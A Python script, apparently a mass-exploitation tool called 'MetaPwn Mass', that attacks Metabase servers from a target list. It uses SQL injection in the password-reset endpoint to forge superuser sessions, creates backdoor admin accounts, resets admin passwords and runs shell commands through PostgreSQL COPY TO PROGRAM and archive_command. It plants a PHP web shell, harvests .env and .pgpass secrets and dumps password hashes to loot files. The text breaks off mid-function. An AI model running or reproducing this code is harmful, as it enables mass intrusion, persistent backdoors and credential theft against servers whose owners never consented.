#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function

import argparse
import base64
import hashlib
import json
import os
import Queue
import random
import re
import sys
import threading
import time
import uuid

import urllib2

TOOL = "MetaPwn Mass"
RESET = "/api/session/reset_password"
CURRENT = "/api/user/current"

PRINT_LOCK = threading.Lock()
FILE_LOCK = threading.Lock()

PY2 = sys.version_info[0] == 2
if PY2:
    text_type = unicode
    binary_type = str
else:
    text_type = str
    binary_type = bytes

JUNK_PATTERNS = ("svc-backup", "soc.backup", "svc.metrics", "svc-39w6gd", "bi-")

RCE_HEADER    = ("# target\tengine\tversion\texec_method\texec_status\t"
                 "super\texec_prog\tread_files\twrite_files\tdb_user\tproof\n")
PASSWD_HEADER = "# target\temail\tpassword\tsession_id\tstatus\n"
SHELL_HEADER  = "# target\tdocroot\tshell_url\tperms\texec_proof\tstatus\n"

DOCROOT_CANDIDATES = (
    "/var/www/html", "/var/www", "/var/www/htdocs", "/var/www/html/public",
    "/srv/www", "/srv/www/htdocs", "/usr/share/nginx/html", "/var/lib/nginx/html",
    "/usr/local/apache2/htdocs", "/app/public", "/app/static", "/app/webroot",
    "/data/www", "/opt/www", "/home/www", "/www", "/var/www/html/site",
)

NON_WEB_PORTS = (5432, 5433, 3306, 6379, 27017, 9200, 11211)


def clean(v):
    if v is None:
        return ""
    if isinstance(v, binary_type) and not isinstance(v, text_type):
        v = v.decode("utf-8", "replace")
    s = v if isinstance(v, text_type) else text_type(v)
    s = s.replace(u"\t", u" ").replace(u"\r", u" ").replace(u"\n", u" ").strip()
    return s.encode("utf-8", "replace") if PY2 else s


def is_probe(email):
    e = email or ""
    return e.startswith("mp-") and e.endswith("@local.invalid")


class Sink(object):
    def __init__(self, rce_path, passwd_path, shell_path=None, echo=True):
        self.rce_path = rce_path
        self.passwd_path = passwd_path
        self.shell_path = shell_path
        self.echo = echo
        self._init(rce_path, RCE_HEADER)
        self._init(passwd_path, PASSWD_HEADER)
        if shell_path:
            self._init(shell_path, SHELL_HEADER)

    def _init(self, path, header):
        with FILE_LOCK:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                return
            f = open(path, "a")
            try:
                f.write(header)
                f.flush()
            finally:
                f.close()

    def _write_rows(self, path, rows):
        if not rows:
            return
        if rows and isinstance(rows[0], (str, unicode if PY2 else str)):
            rows = [rows]
        with FILE_LOCK:
            f = open(path, "a")
            try:
                for r in rows:
                    f.write("\t".join(clean(x) for x in r) + "\n")
                f.flush()
            finally:
                f.close()

    def passwd(self, rows):
        self._write_rows(self.passwd_path, rows)
        if self.echo and rows:
            for r in rows:
                self.say("[PWD ] " + " | ".join(clean(x) for x in r))

    def rce(self, row):
        self._write_rows(self.rce_path, [row])
        if self.echo:
            self.say("[RCE ] " + " | ".join(str(x) for x in row))

    def shell(self, row):
        if not self.shell_path:
            return
        self._write_rows(self.shell_path, [row])
        if self.echo:
            self.say("[SHEL] " + " | ".join(str(x) for x in row))

    def say(self, msg):
        with PRINT_LOCK:
            print(msg)
            sys.stdout.flush()


def rip():
    return "%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4))


def http(base, path, method="GET", body=None, headers=None, timeout=20):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    hdr = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, */*",
        "X-Forwarded-For": rip(),
    }
    if data is not None:
        hdr["Content-Type"] = "application/json"
    if headers:
        hdr.update(headers)
    req = urllib2.Request(base + path, data=data, headers=hdr)
    if method != "GET":
        req.get_method = lambda: method
    t0 = time.time()
    try:
        r = urllib2.urlopen(req, timeout=timeout)
        return r.getcode(), r.read().decode("utf-8", "replace"), time.time() - t0
    except urllib2.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), time.time() - t0
    except Exception as e:
        return None, str(e), time.time() - t0


def _get(base, path, hdr, timeout):
    return http(base, path, "GET", None, hdr, timeout)

def _post(base, path, body, hdr, timeout):
    return http(base, path, "POST", body, hdr, timeout)

def _del(base, path, hdr, timeout):
    return http(base, path, "DELETE", None, hdr, timeout)

def _url_get(url, timeout=20):
    i = url.find("/", url.find("//") + 2)
    if i < 0:
        return http(url, "/", "GET", None, None, timeout)
    return http(url[:i], url[i:], "GET", None, None, timeout)


def inject(base, stmt, timeout=20):
    payload = "-2147483648) ); " + stmt + "; --"
    return _post(base, RESET, {"token": "x", "password": "Password@123",
                               "user-id": {"select": {"raw": payload}}}, None, timeout)


def forge(base, timeout=20, tries=2):
    for _ in range(tries):
        sid = str(uuid.uuid4())
        kh = hashlib.sha256(sid.encode("utf-8")).hexdigest()
        inject(base,
               "INSERT INTO core_session (id, user_id, created_at, key_hashed) "
               "SELECT '{0}', id, NOW(), '{1}' FROM core_user "
               "WHERE is_superuser IS TRUE AND is_active IS TRUE "
               "ORDER BY id LIMIT 1".format(sid, kh), timeout)
        st, txt, _ = _get(base, CURRENT, {"X-Metabase-Session": sid}, timeout)
        if st == 200:
            try:
                return sid, json.loads(txt)
            except Exception:
                return sid, {}
    return None, None


def detect_engine(base, timeout=20):
    for _ in range(3):
        st, txt, el = inject(base, "SELECT pg_sleep(3)", timeout + 6)
        if "Too many attempts" in (txt or ""):
            time.sleep(1.5)
            continue
        if st is None:
            return "unknown"
        return "postgresql" if el > 2.0 else "non-postgresql"
    return "unknown"


def probe_user(base, sid, timeout=20):
    tag = uuid.uuid4().hex[:8]
    email = "mp-%s@local.invalid" % tag
    pwd = "Mp%s!Pwn" % tag[:6]
    st, txt, _ = _post(base, "/api/user",
                       {"first_name": "mp", "last_name": "MPP" + tag,
                        "email": email, "password": pwd, "group_ids": [2]},
                       {"X-Metabase-Session": sid}, timeout)
    if st not in (200, 201):
        return None, None, None, None
    try:
        return json.loads(txt).get("id"), email, pwd, "MPP" + tag
    except Exception:
        return None, None, None, None


def readback(base, sid, uid, expr, sentinel, timeout=20):
    hdr = {"X-Metabase-Session": sid}
    inject(base, "UPDATE core_user SET last_name = '" + sentinel +
           "' WHERE id = " + str(uid), timeout)
    inject(base, "UPDATE core_user SET last_name = CAST((" + expr +
           ") AS VARCHAR) WHERE id = " + str(uid), timeout)
    time.sleep(0.2)
    st, txt, _ = _get(base, "/api/user/%d" % uid, hdr, timeout)
    if st != 200:
        return None
    try:
        v = json.loads(txt).get("last_name")
    except Exception:
        return None
    if v in (None, sentinel, ""):
        return None
    return v


def drop_probe(base, sid, uid, timeout=20, tries=3):
    hdr = {"X-Metabase-Session": sid}
    for _ in range(tries):
        inject(base, "DELETE FROM core_user WHERE id = %d" % uid, timeout)
        st, _t, _e = _get(base, "/api/user/%d" % uid, hdr, timeout)
        if st == 404:
            return 404
        time.sleep(1.5)
    _post(base, "/api/user/%d" % uid, {"is_active": False}, hdr, timeout)
    _del(base, "/api/user/%d" % uid, hdr, timeout)
    st, _t, _e = _get(base, "/api/user/%d" % uid, hdr, timeout)
    return st


def pg_read_chunked(base, sid, uid, path, sentinel, opt, max_bytes=200000, chunk=200):
    buf = ""
    off = 0
    while off < max_bytes:
        c = readback(base, sid, uid,
                     "pg_read_file('%s', %d, %d)" % (path, off, chunk),
                     sentinel, opt.timeout)
        if not c:
            break
        buf += c
        off += len(c)
        if len(c) < chunk:
            break
    return buf


def check_privileges(base, sid, uid, sentinel, opt):
    out = {"super": False, "exec_prog": False,
           "read_files": False, "write_files": False, "db_user": None}

    dbu = readback(base, sid, uid, "current_user", sentinel, opt.timeout)
    if dbu:
        out["db_user"] = dbu

    checks = (
        ("super",       "(SELECT rolsuper FROM pg_roles WHERE rolname = current_user)"),
        ("exec_prog",   "pg_has_role(current_user, 'pg_execute_server_program', 'MEMBER')"),
        ("read_files",  "pg_has_role(current_user, 'pg_read_server_files', 'MEMBER')"),
        ("write_files", "pg_has_role(current_user, 'pg_write_server_files', 'MEMBER')"),
    )
    for name, expr in checks:
        v = readback(base, sid, uid,
                     "CASE WHEN (%s) THEN 'yes' ELSE 'no' END" % expr,
                     sentinel, opt.timeout)
        out[name] = (v == "yes")
    return out


def _try_copy_to_program(base, sid, uid, sentinel, cmd, opt):
    tag = uuid.uuid4().hex[:8]
    out = "/tmp/mp_%s.out" % tag
    shell = "%s > %s 2>&1" % (cmd, out)
    inject(base, "COPY (SELECT 1) TO PROGRAM '%s'" % shell.replace("'", "''"), opt.timeout)
    time.sleep(0.6)
    got = readback(base, sid, uid, "pg_read_file('%s', 0, 300)" % out, sentinel, opt.timeout)
    inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % out, opt.timeout)
    return (got or "").strip().replace("\n", " ")[:200]


def _try_copy_from_program(base, sid, uid, sentinel, cmd, opt):
    tag = uuid.uuid4().hex[:8]
    tbl = "mp_%s" % tag
    try:
        inject(base, "CREATE TEMP TABLE %s(line text)" % tbl, opt.timeout)
        inject(base, "COPY %s FROM PROGRAM '%s'" % (tbl, cmd.replace("'", "''")), opt.timeout)
        got = readback(base, sid, uid,
                       "(SELECT string_agg(line, ' ') FROM %s)" % tbl,
                       sentinel, opt.timeout)
        inject(base, "DROP TABLE IF EXISTS %s" % tbl, opt.timeout)
        return (got or "").strip()[:200]
    except Exception:
        return ""


def _try_archive_command(base, sid, uid, sentinel, cmd, opt):
    tag = uuid.uuid4().hex[:8]
    out = "/tmp/mp_arch_%s" % tag
    old = readback(base, sid, uid,
                   "coalesce(current_setting('archive_command', true),'')",
                   sentinel, opt.timeout) or ""
    old_esc = old.replace("'", "''")
    full_cmd = "%s > %s 2>&1; true" % (cmd, out)
    try:
        inject(base, "ALTER SYSTEM SET archive_command = '%s'"
               % full_cmd.replace("'", "''"), opt.timeout)
        inject(base, "SELECT pg_reload_conf()", opt.timeout)
        time.sleep(0.5)
        inject(base, "SELECT pg_switch_wal()", opt.timeout)
        inject(base, "CHECKPOINT", opt.timeout)
        time.sleep(2.0)
        got = readback(base, sid, uid, "pg_read_file('%s', 0, 300)" % out, sentinel, opt.timeout)
        return (got or "").strip()[:200]
    finally:
        inject(base, "ALTER SYSTEM SET archive_command = '%s'" % old_esc, opt.timeout)
        inject(base, "SELECT pg_reload_conf()", opt.timeout)
        inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % out, opt.timeout)


def attempt_rce(base, sid, uid, sentinel, cmd, opt):
    """Try each exec path; returns (method, output)."""
    for name, fn in (
        ("copy-to-program", _try_copy_to_program),
        ("copy-from-program", _try_copy_from_program),
        ("archive-command", _try_archive_command),
    ):
        try:
            out = fn(base, sid, uid, sentinel, cmd, opt)
            if out:
                return name, out
        except Exception:
            continue
    return "", ""


def try_lo_export(base, sid, uid, sentinel, path, content, opt):
    b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
    oid = readback(base, sid, uid,
                   "lo_from_bytea(0, decode('%s', 'base64'))::text" % b64,
                   sentinel, opt.timeout)
    if not oid or not oid.isdigit():
        return False
    inject(base, "SELECT lo_export(%s, '%s')" % (oid, path.replace("'", "''")), opt.timeout)
    inject(base, "SELECT lo_unlink(%s)" % oid, opt.timeout)
    time.sleep(0.3)
    chk = readback(base, sid, uid,
                   "coalesce(pg_stat_file('%s').size::text,'0')" % path.replace("'", "''"),
                   sentinel, opt.timeout)
    return bool(chk and chk.isdigit() and int(chk) > 0)


def try_copy_to_file(base, sid, uid, sentinel, path, content, opt):
    esc = content.replace("'", "''")
    inject(base, "COPY (SELECT '%s') TO '%s'" % (esc, path.replace("'", "''")), opt.timeout)
    time.sleep(0.3)
    chk = readback(base, sid, uid,
                   "coalesce(pg_stat_file('%s').size::text,'0')" % path.replace("'", "''"),
                   sentinel, opt.timeout)
    return bool(chk and chk.isdigit() and int(chk) > 0)


def _extract_host(base):
    m = re.match(r'^https?://([^/:]+)', base)
    return m.group(1) if m else base.split(":")[0]


def _extract_port(base):
    m = re.search(r':(\d+)', base)
    if m:
        return int(m.group(1))
    return 443 if base.startswith("https://") else 80


def _candidate_ports(base, detected_ports):
    base_port = _extract_port(base)
    skip = set(NON_WEB_PORTS) | {base_port}
    out = [p for p in detected_ports if p not in skip]
    for p in (80, 8080, 8000, 8443, 443):
        if p not in out and p not in skip:
            out.append(p)
    return out


def probe_web_host(base, sid, uid, sentinel, opt, sink):
    tag = uuid.uuid4().hex[:8]
    out = "/tmp/mp_we_%s" % tag
    cmd = (
        "("
        "(ss -tln 2>/dev/null || netstat -tln 2>/dev/null) "
        "  | awk 'NR>1 {print \"PORT \" $4}'; "
        "ps aux 2>/dev/null | grep -E 'nginx|apache|httpd|php-fpm|php-cgi' "
        "  | grep -v grep | head -n20; "
        "command -v php php-fpm php-cgi 2>/dev/null; "
        "for c in /etc/nginx/nginx.conf /etc/nginx/sites-enabled/* "
        "         /etc/nginx/conf.d/*.conf; do "
        "  [ -f \"$c\" ] && grep -hE '^[[:space:]]*root[[:space:]]' \"$c\" 2>/dev/null; done; "
        "for c in /etc/apache2/sites-enabled/* /etc/apache2/apache2.conf "
        "         /etc/httpd/conf/httpd.conf /etc/httpd/conf.d/*.conf; do "
        "  [ -f \"$c\" ] && grep -hi 'DocumentRoot' \"$c\" 2>/dev/null; done; "
        "for p in $(pgrep -f 'php-fpm|php-cgi|nginx|apache2|httpd' 2>/dev/null); do "
        "  readlink /proc/$p/cwd 2>/dev/null; done"
        ") > %s 2>&1; exit 0" % out
    )
    inject(base, "COPY (SELECT 1) TO PROGRAM '%s'" % cmd.replace("'", "''"), opt.timeout)
    time.sleep(0.9)
    raw = pg_read_chunked(base, sid, uid, out, sentinel, opt, max_bytes=50000)
    inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % out, opt.timeout)

    ports, docroots, procs, php_paths = [], [], [], []
    for line in (raw or "").split("\n"):
        line = line.strip()
        if not line:
            continue
        if line.startswith("PORT "):
            addr = line[5:].strip()
            port = addr.rsplit(":", 1)[-1].rsplit(".", 1)[-1]
            if port.isdigit() and int(port) not in ports:
                ports.append(int(port))
            continue
        if any(x in line for x in ("nginx", "apache", "httpd", "php-fpm", "php-cgi")):
            procs.append(line); continue
        if line.startswith("/usr/") and "php" in line:
            php_paths.append(line); continue
        m = re.search(r'root\s+([/][^;\s]+)', line)
        if m:
            docroots.append(m.group(1)); continue
        m = re.search(r'DocumentRoot\s+"?([/][^"\s]+)"?', line, re.I)
        if m:
            docroots.append(m.group(1)); continue
        if line.startswith("/"):
            docroots.append(line)

    bad = ("postgres", "postgresql", "mysql", "/data")
    docroots = [d for d in docroots if not any(b in d for b in bad) and d != "/data"]

    has_web = bool(procs) or any(p in (80, 443, 8080, 8000, 8443) for p in ports)
    php = bool(php_paths) or any("php" in p for p in procs)

    return {"has_web": has_web, "ports": ports, "docroots": docroots, "php": php}


def find_writable(base, sid, uid, sentinel, opt, candidates):
    if not candidates:
        return None
    tag = uuid.uuid4().hex[:8]
    out = "/tmp/mp_wr_%s" % tag
    pool, seen = [], set()
    for d in candidates:
        if d and d not in seen:
            seen.add(d); pool.append(d)
    roots = " ".join("'%s'" % c for c in pool[:40])
    cmd = 'for d in %s; do [ -d "$d" ] && [ -w "$d" ] && echo "$d" >> %s; done; exit 0' % (
        roots, out)
    inject(base, "COPY (SELECT 1) TO PROGRAM '%s'" % cmd.replace("'", "''"), opt.timeout)
    time.sleep(0.4)
    raw = readback(base, sid, uid, "pg_read_file('%s', 0, 2000)" % out, sentinel, opt.timeout)
    inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % out, opt.timeout)
    if not raw:
        return None
    for line in raw.split("\n"):
        line = line.strip()
        if line.startswith("/"):
            return line
    return None


def shell_payload(marker):
    lt, q, gt, d, us, sq = chr(60), chr(63), chr(62), chr(36), chr(95), chr(39)
    return (lt + q + "php "
            + "echo " + sq + marker + sq + "; "
            + "echo " + "shell" + us + "exec(" + d + us + "GET[" + sq + "c" + sq + "]); "
            + q + gt)


def _verify_url(url, marker, opt):
    try:
        st, txt, _ = _url_get(url + "?c=id", opt.timeout)
    except Exception:
        return False, ""
    if st != 200:
        return False, ""
    body = txt or ""
    if "<?php" in body:
        return False, ""
    if marker not in body:
        return False, ""
    return True, body.split(marker, 1)[1].strip().replace("\n", " ")[:160]


def drop_shell(base, sid, uid, sentinel, opt, sink, use_exec):
    sink.say("[~] %s shell: probing host (mode=%s)"
             % (base, "exec" if use_exec else "file-write"))

    if use_exec:
        we = probe_web_host(base, sid, uid, sentinel, opt, sink)
    else:
        we = {"has_web": True, "ports": [], "docroots": [], "php": True}

    if not we["docroots"]:
        we["docroots"] = list(DOCROOT_CANDIDATES)

    if use_exec:
        docroot = find_writable(base, sid, uid, sentinel, opt,
                                we["docroots"] + list(DOCROOT_CANDIDATES))
        if not docroot:
            sink.say("[-] %s no writable docroot found" % base)
            sink.shell([base, "-", "-", "-", "no writable docroot", "no-docroot"])
            return
    else:
        docroot = None
        for c in we["docroots"] + list(DOCROOT_CANDIDATES):
            if not c:
                continue
            probe = c.rstrip("/") + "/.mp_probe_%s" % uuid.uuid4().hex[:6]
            if try_lo_export(base, sid, uid, sentinel, probe, "x", opt):
                docroot = c
                break
        if not docroot:
            sink.say("[-] %s no docroot writable via lo_export" % base)
            sink.shell([base, "-", "-", "-",
                        "pg_write_server_files present but no writable docroot",
                        "no-docroot"])
            return

    tag = uuid.uuid4().hex[:8]
    name = "mp%s.php" % tag
    marker = "MPWS%s>" % tag
    payload = shell_payload(marker)
    status = "/tmp/mp_sh_%s.st" % tag
    path = docroot.rstrip("/") + "/" + name

    written = False
    write_method = ""
    if use_exec:
        b64 = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        cmd = ("printf %%s '%s' | base64 -d > %s; chmod 644 %s; "
               "(ls -l %s > %s 2>&1; test -s %s || echo MISSING >> %s); exit 0"
               % (b64, path, path, path, status, path, status))
        inject(base, "COPY (SELECT 1) TO PROGRAM '%s'" % cmd.replace("'", "''"), opt.timeout)
        time.sleep(0.6)
        info = readback(base, sid, uid, "pg_read_file('%s', 0, 300)" % status,
                        sentinel, opt.timeout)
        inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % status, opt.timeout)
        if info and "MISSING" not in info:
            written = True
            write_method = "copy-to-program"
            perms = info.strip().replace("\t", " ")[:120]
        else:
            perms = ""
    else:
        if try_lo_export(base, sid, uid, sentinel, path, payload, opt):
            written = True
            write_method = "lo_export"
            perms = "(written via lo_export)"
        else:
            perms = ""

    if not written:
        sink.shell([base, docroot, "-", "-",
                    "write failed (method=%s)" % ("exec" if use_exec else "lo_export"),
                    "write-failed"])
        return

    urls = []
    if opt.shell_url:
        urls.append(opt.shell_url.rstrip("/") + "/" + name)
    host = _extract_host(base)
    for port in _candidate_ports(base, we.get("ports", [])):
        s = "https" if port == 443 else "http"
        u = "%s://%s:%d/%s" % (s, host, port, name)
        if u not in urls:
            urls.append(u)

    verified_url = ""
    proof = ""
    for url in urls:
        ok, out = _verify_url(url, marker, opt)
        if ok:
            verified_url = url
            proof = "EXEC: %s" % out
            break

    if verified_url:
        sink.shell([base, docroot, verified_url, perms,
                    "EXEC via %s | %s" % (write_method, proof), "verified"])
        sink.say("[+] %s shell VERIFIED: %s (%s)"
                 % (base, verified_url, write_method))
    else:
        sink.shell([base, docroot, "-", perms,
                    "written via %s; not reachable from scanner (%d URLs tried)"
                    % (write_method, len(urls)),
                    "written"])

    if opt.shell_rm:
        if use_exec:
            inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % path, opt.timeout)
        else:
            inject(base, "SELECT pg_catalog.lo_unlink(0) WHERE false", opt.timeout)


def read_env_file(base, sid, uid, sentinel, path, opt):
    return pg_read_chunked(base, sid, uid, path, sentinel, opt,
                           max_bytes=30000, chunk=200)


def dump_secrets_via_read(base, sid, uid, sentinel, opt, sink):

    tag = uuid.uuid4().hex[:8]
    files = [
        "/app/.env", "/opt/metabase/.env", "/metabase/.env",
        "/root/.env", "/var/lib/metabase/.env", "/etc/metabase/metabase.env",
        "/root/.pgpass", "/home/postgres/.pgpass",
        "/var/lib/postgresql/.pgpass",
    ]
    pattern = re.compile(
        r'^(?:export\s+)?([A-Z0-9_]+)\s*=\s*(.+)$'
    )
    keep = re.compile(
        r'PASS|SECRET|KEY|TOKEN|DSN|DATABASE_URL|MB_DB|SMTP|AWS|JWT|'
        r'ENCRYPT|LDAP|GOOGLE|SLACK|S3_|STRIPE|SENDGRID|TWILIO', re.I)

    rows = []
    seen = set()
    for path in files:
        raw = read_env_file(base, sid, uid, sentinel, path, opt)
        if not raw:
            continue
        for line in raw.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = pattern.match(line)
            if not m:
                continue
            k = m.group(1).strip()
            v = m.group(2).strip().strip('"').strip("'")
            if not keep.search(k) or not v:
                continue
            if (k, v) in seen:
                continue
            seen.add((k, v))
            rows.append([base, "%s:%s" % (path, k), "-", "-",
                         "env-secret:%s=%s" % (k, v)])

    for path in ("/root/.pgpass", "/home/postgres/.pgpass",
                 "/var/lib/postgresql/.pgpass"):
        raw = read_env_file(base, sid, uid, sentinel, path, opt)
        if not raw:
            continue
        for line in raw.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) < 5:
                continue
            user = parts[3]
            pwd = ":".join(parts[4:])
            if (path, user) in seen:
                continue
            seen.add((path, user))
            rows.append([base, "pg:%s@%s:%s/%s" % (user, parts[0], parts[1], parts[2]),
                         pwd, "-", "pgpass"])

    if rows:
        sink.passwd(rows)
        sink.say("[SEC ] %s: %d credential row(s) recovered via pg_read_file"
                 % (base, len(rows)))


def extract_user_hashes(base, sid, probe_id, sentinel, users, opt, sink):
    """Opt-in (--hashes). Dumps bcrypt hashes from core_user."""
    if not users:
        return
    sink.say("[~] %s hashes: dumping %d accounts" % (base, len(users)))
    tag = uuid.uuid4().hex[:8]
    out = "/tmp/mp_pw_%s" % tag
    sql = ("COPY (SELECT coalesce(email,'') || chr(9) || coalesce(password,'') "
           "FROM core_user WHERE password IS NOT NULL) TO PROGRAM 'cat > %s'"
           % out)
    inject(base, sql, opt.timeout)
    time.sleep(0.4)
    raw = pg_read_chunked(base, sid, probe_id, out, sentinel, opt)
    inject(base, "COPY (SELECT 1) TO PROGRAM 'rm -f %s; exit 0'" % out, opt.timeout)
    rows = []
    for line in (raw or "").split("\n"):
        if "\t" not in line:
            continue
        em, h = line.split("\t", 1)
        if em and h:
            rows.append([base, clean(em), clean(h), "-", "bcrypt-hash"])
    if rows:
        sink.passwd(rows)


def save_working_session(base, me, sid, sink):
    admin_email = clean((me or {}).get("email") or "?")
    sink.passwd([[base, admin_email, "-", sid, "verified-forged-session"]])


def make_login_user(base, sid, opt, sink):
    tag = uuid.uuid4().hex[:8]
    email = "ops-%s@admin.local" % tag
    pwd = "Pwn#%s!" % tag
    st, _txt, _ = _post(base, "/api/user",
                        {"first_name": "ops", "last_name": "admin",
                         "email": email, "password": pwd,
                         "group_ids": [1, 2]},
                        {"X-Metabase-Session": sid}, opt.timeout)
    if st not in (200, 201):
        sink.say("[!] %s could not create login user (HTTP %s)" % (base, st))
        return
    st2, txt2, _ = _post(base, "/api/session",
                         {"username": email, "password": pwd},
                         None, opt.timeout)
    if st2 == 200:
        try:
            sid2 = json.loads(txt2).get("id", "")
        except Exception:
            sid2 = ""
        sink.passwd([[base, email, pwd, sid2 or "-", "verified-new-admin"]])
    else:
        sink.passwd([[base, email, pwd, "-", "created-login-%s" % st2]])


def reset_admin_password(base, sid, admin_email, opt, sink):
    tag = uuid.uuid4().hex[:6]
    new_pwd = "Pwn#%s!" % tag
    email_esc = admin_email.replace("'", "''")
    pwd_esc = new_pwd.replace("'", "''")

    inject(base, "CREATE EXTENSION IF NOT EXISTS pgcrypto", opt.timeout)
    inject(base, "UPDATE core_user SET password = crypt('%s', gen_salt('bf', 10)) "
                 "WHERE email = '%s'" % (pwd_esc, email_esc), opt.timeout)
    time.sleep(0.4)

    st, txt, _ = _post(base, "/api/session",
                       {"username": admin_email, "password": new_pwd},
                       None, opt.timeout)
    if st == 200:
        try:
            sid2 = json.loads(txt).get("id", "")
        except Exception:
            sid2 = ""
        sink.passwd([[base, clean(admin_email), new_pwd, sid2 or "-",
                      "verified-reset"]])
    else:
        sink.passwd([[base, clean(admin_email), new_pwd, "-",
                      "reset-login-failed-%s" % st]])


def fetch_users(base, sid, timeout=20):
    hdr = {"X-Metabase-Session": sid}
    users = []
    for q in ("/api/user?status=all&limit=1000",
              "/api/user?include_deactivated=true&limit=1000",
              "/api/user"):
        st, txt, _ = _get(base, q, hdr, timeout)
        if st != 200:
            continue
        try:
            d = json.loads(txt)
        except Exception:
            continue
        rows = d.get("data", d) if isinstance(d, dict) else d
        if isinstance(rows, list) and rows:
            users = rows
            break
    return [u for u in users if isinstance(u, dict) and not is_probe(u.get("email"))]


def check_target(target, opt, sink):
    base = target.strip()
    if not base or base.startswith("#"):
        return
    if not base.startswith("http"):
        base = ("https://" if opt.ssl else "http://") + base
    base = base.rstrip("/")

    sink.say("[~] %s probing" % base)
    st, txt, _ = _get(base, "/api/session/properties", None, opt.timeout)
    if st is None:
        sink.say("[-] %s unreachable" % base)
        return
    try:
        props = json.loads(txt)
        if not isinstance(props, dict) or "version" not in props:
            raise ValueError
        v = props.get("version")
        tag = (v or {}).get("tag", "") if isinstance(v, dict) else str(v or "")
        version = tag if tag.startswith("v") else ("v" + tag if tag else "")
    except Exception:
        sink.say("[-] %s not Metabase" % base)
        return

    sink.say("[~] %s metabase %s, forging session" % (base, version))
    sid, me = forge(base, opt.timeout)
    if not sid:
        sink.say("[-] %s not vulnerable" % base)
        return
    sink.say("[+] %s %s VULNERABLE as %s"
             % (base, version, (me or {}).get("email", "?")))

    save_working_session(base, me, sid, sink)
    if opt.login_user:
        make_login_user(base, sid, opt, sink)
    if opt.reset_admin:
        reset_admin_password(base, sid, opt.reset_admin, opt, sink)

    sink.say("[~] %s engine detection" % base)
    engine = detect_engine(base, opt.timeout)
    if engine != "postgresql":
        sink.say("[-] %s engine=%s (no postgres feature paths)" % (base, engine))
        return

    sink.say("[~] %s RCE verification" % base)
    uid, _pe, _pw, sentinel = probe_user(base, sid, opt.timeout)
    if uid is None:
        sink.say("[!] %s could not create probe user" % base)
        return

    try:
        priv = check_privileges(base, sid, uid, sentinel, opt)
        sink.say("[~] %s privs: super=%d exec=%d read=%d write=%d db_user=%s"
                 % (base, int(priv["super"]), int(priv["exec_prog"]),
                    int(priv["read_files"]), int(priv["write_files"]),
                    priv["db_user"] or "?"))

        proof_parts = ["db_user=%s" % (priv["db_user"] or "?")]

        method = "none"
        exec_status = "no"
        if opt.exec_cmd and (priv["super"] or priv["exec_prog"]):
            m, out = attempt_rce(base, sid, uid, sentinel, opt.exec_cmd, opt)
            if out:
                method = m
                exec_status = "yes"
                proof_parts.append("EXEC[%s] via %s: %s" % (opt.exec_cmd, m, out))
            else:
                proof_parts.append("exec attempted via 3 methods, none succeeded")

        if exec_status != "yes" and priv["write_files"] and opt.shell:
            sink.say("[~] %s exec gate closed, trying file-write path" % base)
            drop_shell(base, sid, uid, sentinel, opt, sink, use_exec=False)
            exec_status = "file-write"
            method = "lo_export"

        if exec_status == "yes" and opt.shell:
            drop_shell(base, sid, uid, sentinel, opt, sink, use_exec=True)

        if priv["read_files"]:
            proof_parts.append("read_files=yes")
            dump_secrets_via_read(base, sid, uid, sentinel, opt, sink)

        if opt.hashes and (priv["super"] or priv["exec_prog"]):
            users = fetch_users(base, sid, opt.timeout)
            extract_user_hashes(base, sid, uid, sentinel, users, opt, sink)
        elif opt.hashes:
            sink.say("[~] %s hashes requested but exec unavailable - skipped" % base)

        sink.rce([
            base, engine, version,
            method, exec_status,
            "yes" if priv["super"] else "no",
            "yes" if priv["exec_prog"] else "no",
            "yes" if priv["read_files"] else "no",
            "yes" if priv["write_files"] else "no",
            priv["db_user"] or "?",
            " | ".join(proof_parts),
        ])

        if (not priv["super"] and not priv["exec_prog"]
                and not priv["read_files"] and not priv["write_files"]):
            sink.say("[-] %s all postgres capabilities absent - "
                     "only login creds available" % base)
    finally:
        left = drop_probe(base, sid, uid, opt.timeout)
        if left != 404:
            sink.say("[!] %s probe id=%s not deleted (last=%s)" % (base, uid, left))


def worker(q, opt, sink):
    while True:
        try:
            target = q.get_nowait()
        except Queue.Empty:
            return
        try:
            check_target(target, opt, sink)
        except Exception as e:
            if opt.verbose:
                import traceback
                sink.say("[!] %s error: %s" % (target, e))
                sink.say(traceback.format_exc())
        finally:
            q.task_done()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("listfile")
    ap.add_argument("-t", "--threads", type=int, default=10)
    ap.add_argument("-o", "--outdir", default=".")

    ap.add_argument("--rce-file",    default="rce.txt")
    ap.add_argument("--passwd-file", default="user_password.txt")
    ap.add_argument("--shell-file",  default="shell.txt")

    ap.add_argument("--timeout", type=float, default=20)
    ap.add_argument("--ssl", action="store_true")

    ap.add_argument("--exec", dest="exec_cmd", default="id")
    ap.add_argument("--no-exec", dest="exec_cmd", action="store_const",
                    const=None, default=argparse.SUPPRESS)

    ap.add_argument("--no-shell", dest="shell", action="store_false")
    ap.add_argument("--shell-url", default=None)
    ap.add_argument("--shell-rm", action="store_true")

    ap.add_argument("--no-login-user", dest="login_user", action="store_false")
    ap.add_argument("--reset-admin", default=None, metavar="EMAIL")
    ap.add_argument("--hashes", dest="hashes", action="store_true")

    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    opt = ap.parse_args()

    if not os.path.exists(opt.listfile):
        sys.exit("list file not found: %s" % opt.listfile)

    targets = []
    with open(opt.listfile) as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                targets.append(s)
    if not targets:
